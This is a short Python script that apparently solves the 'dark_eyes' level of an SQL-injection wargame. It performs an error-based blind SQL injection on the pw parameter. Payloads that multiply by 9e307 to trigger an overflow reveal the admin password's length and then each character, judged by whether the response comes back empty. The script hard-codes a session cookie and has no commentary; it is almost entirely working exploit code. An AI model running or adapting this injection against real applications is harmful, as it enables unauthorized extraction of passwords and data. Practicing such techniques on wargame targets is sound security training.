import requests, string

cookies = {"PHPSESSID": "v0rehun6s577e054b6qj5vpd8h"}

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"

password_length = 0

for l in range(1,100):
  payload = "' or id='admin' and (((length(pw)={length})+1)*9e307)#".format(length=l)
  params = {"pw": payload}
  r = requests.get(url, params=params, cookies=cookies)
  if len(r.text) == 0:
    password_length = l
    print("Password length is %s" % (password_length))
    break

password = ""

for l in range(1, password_length+1):
  for c in string.printable:
    payload = "' or id='admin' and (((ascii(substring(pw,{offset},1))={character})+1)*9e307)#".format(offset=l, character=ord(c))
    params = {"pw": payload}
    r = requests.get(url, params=params, cookies=cookies)
    if len(r.text) == 0:
      password += c
      print(password)
      break